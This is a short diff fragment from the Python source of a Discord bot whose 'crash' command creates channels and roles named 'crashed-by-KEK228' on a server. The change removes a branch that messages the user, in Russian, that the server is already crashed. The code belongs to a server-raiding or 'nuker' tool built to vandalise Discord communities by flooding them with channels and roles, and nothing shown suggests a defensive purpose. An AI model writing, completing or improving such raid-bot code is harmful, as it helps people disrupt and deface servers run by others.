@@ -106,8 +106,6 @@ async def crash(ctx):
          d = d + 1
          await guild.create_text_channel('crashed-by-KEK228')
          await guild.create_role(name="crashed-by-KEK228")
-   else:
-        ctx.author.send('Сервер уже крашнут!')
 
 @Bot.command()
 async def help(ctx):
